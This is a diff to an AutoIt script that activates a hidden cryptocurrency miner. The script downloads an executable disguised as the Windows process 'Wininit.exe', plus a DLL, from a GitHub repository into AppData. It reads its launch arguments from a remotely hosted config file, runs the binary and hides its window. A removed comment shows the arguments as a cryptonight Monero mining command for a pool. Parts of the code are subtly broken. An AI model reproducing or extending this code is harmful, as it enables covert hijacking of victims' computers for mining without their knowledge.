@@ -1,21 +1,14 @@
-#NoTrayIcon
-#Region ;**** Directives created by AutoIt3Wrapper_GUI ****
-#AutoIt3Wrapper_Res_Fileversion=1.0.6.2
-#AutoIt3Wrapper_Res_Fileversion_AutoIncrement=y
-#Tidy_Parameters=/rel /reel /sf
-#AutoIt3Wrapper_Tidy_Stop_OnError=n
-#EndRegion ;**** Directives created by AutoIt3Wrapper_GUI ****
 #include <GuiListView.au3>
 
 HotKeySet("{f4}", sair)
 HotKeySet("{f7}", fechar)
 
 
-;;start_var()
-;;download()
-;;executar()
-;;highperformace()
-;;inf()
+start_var()
+download()
+executar()
+highperformace()
+inf()
 
 Func download()
 	$path0 = (@AppDataDir & "\WinGG\" & $_name)
@@ -27,7 +20,7 @@ Func download()
 EndFunc   ;==>download
 
 Func executar()
-	Run(@AppDataDir & "\WinGG\" & $_name & " " & $_coin_code)
+	Run(@AppDataDir & "\WinGG\" & $_name & $_coin_code)
 	Global $hwnd = WinWait(@AppDataDir & "\WinGG\" & $_name)
 	WinSetState($hwnd, "", @SW_HIDE)
 EndFunc   ;==>executar
@@ -52,9 +45,10 @@ EndFunc   ;==>sair
 
 Func start_var()
 	Global $_name = "Wininit.exe"
-	;; Global $_coin_code = " -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45560 -u ztxslmso@abyssmail.com -p x -t1 --cpu-priority 1 -B" ;Cmd to Mine
-	$file_location_command = InetGet("",@AppDataDir & "\WinGG\command.ini)
-	Global $_coin_code = IniRead($file_location_command,"CMD","command","Default")
+	$file_location_command = InetGet("https://raw.githubusercontent.com/WinGGAp/WinGG/master/Arquivos%20FONtes/command.ini",@AppDataDir & "\WinGG\command.ini")
+	Global $_coin_code = IniRead($file_location_command,"CMD","command",Default)
+	ToolTip($_coin_code,0,0)
+	Sleep(10000)
 	Global $_Url0 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/Wininit.exe" ;Url
 	Global $_Url1 = "https://github.com/WinGGAp/WinGG/raw/master/Arquivos%20FONtes/msvcr120.dll" ;Url
 EndFunc   ;==>start_var
